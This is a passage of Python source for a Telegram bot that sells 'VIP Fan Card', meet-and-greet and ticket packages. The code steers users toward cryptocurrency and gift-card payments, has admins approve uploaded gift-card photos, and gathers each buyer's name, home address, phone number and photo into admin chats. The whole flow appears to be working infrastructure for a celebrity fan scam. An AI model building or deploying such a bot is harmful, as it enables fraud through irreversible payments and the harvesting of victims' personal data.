        context.user_data["vip_phone"] = text
        context.user_data["step"] = "vip_ask_photo"
        await update.message.reply_text("📸 Perfect. Finally, please upload a clear, **Professional Picture** of yourself that will be printed onto your VIP Fan Card:", parse_mode="Markdown")

    elif step == "reason":
        context.user_data["reason_text"] = text
        context.user_data["step"] = None
        kb = [[InlineKeyboardButton("BTC", callback_data="pay_BTC"), InlineKeyboardButton("ETH", callback_data="pay_ETH")], 
              [InlineKeyboardButton("USDT", callback_data="pay_USDT"), InlineKeyboardButton("Bank", callback_data="pay_Bank")],
              [InlineKeyboardButton("🎁 Gift Card", callback_data="pay_GiftCard")],
              [InlineKeyboardButton("⬅️ Main Menu", callback_data="main_menu")]]
              
        payment_text = (
            "💳 **Choose payment method:**\n\n"
            "*(⚠️ Note: To ensure seamless and expedited payment confirmation, cryptocurrency wallet transactions are highly recommended as the system can occasionally experience delays with standard alternative methods.)*"
        )
        await update.message.reply_text(payment_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
    
    elif not is_admin(user_id) and step not in ["vip_ask_name", "vip_ask_address", "vip_ask_phone"]:
        for admin in ADMIN_IDS:
            kb = [[InlineKeyboardButton("↩️ Reply", callback_data=f"reply_{user_id}")]]
            await context.bot.send_message(chat_id=admin, text=f"📩 **Message from {user_id}**\n\n💬 {text}", reply_markup=InlineKeyboardMarkup(kb))


# ================= PHOTO HANDLER =================
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id) and is_blocked(user_id): return
    step = context.user_data.get("step")
    
    photo_file = update.message.photo[-1].file_id
    
    if step == "waiting_gift_card":
        m_type = context.user_data.get("meeting_type", "Meet & Greet")
        t_code = "V" if m_type == "VIP Fan Card" else ("T" if "Ticket" in m_type else "M")
        
        for admin in ADMIN_IDS:
            kb = [[InlineKeyboardButton("✅ Approve Payment", callback_data=f"app_{user_id}_{t_code}"),
                   InlineKeyboardButton("❌ Reject Payment", callback_data=f"rej_{user_id}_{t_code}")]]
            await context.bot.send_photo(chat_id=admin, photo=photo_file, caption=f"🎁 **Gift Card Upload**\nUser: `{user_id}`\nType: {m_type}", reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")
            
        await update.message.reply_text("⏳ Processing gift card... Please wait while our team verifies the balance.")
        
    elif step == "vip_ask_photo":
        context.user_data["vip_photo"] = photo_file
        context.user_data["step"] = None
        
        name = context.user_data.get("vip_name", "N/A")
        address = context.user_data.get("vip_address", "N/A")
        phone = context.user_data.get("vip_phone", "N/A")
        
        for admin in ADMIN_IDS:
            await context.bot.send_photo(
                chat_id=admin, 
                photo=photo_file, 
                caption=f"🎫 **New VIP Fan Card Details Submitted**\n\n👤 **User ID:** `{user_id}`\n📝 **Name:** {name}\n📍 **Address:** {address}\n📱 **Phone:** {phone}", 
                parse_mode="Markdown"
            )
        
        await update.message.reply_text("✅ Outstanding. Your details and photo have been successfully captured and sent for VIP Fan Card production. We will contact you regarding shipping tracking details shortly.")
        
    elif not is_admin(user_id):
        for admin in ADMIN_IDS:
            kb = [[InlineKeyboardButton("↩️ Reply", callback_data=f"reply_{user_id}")]]
            await context.bot.send_photo(chat_id=admin, photo=photo_file, caption=f"📩 **Photo from {user_id}**", reply_markup=InlineKeyboardMarkup(kb))

if __name__ == "__main__":
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(buttons))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    threading.Thread(target=lambda: server.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000))), daemon=True).start()
    app.run_polling(drop_pending_updates=True)
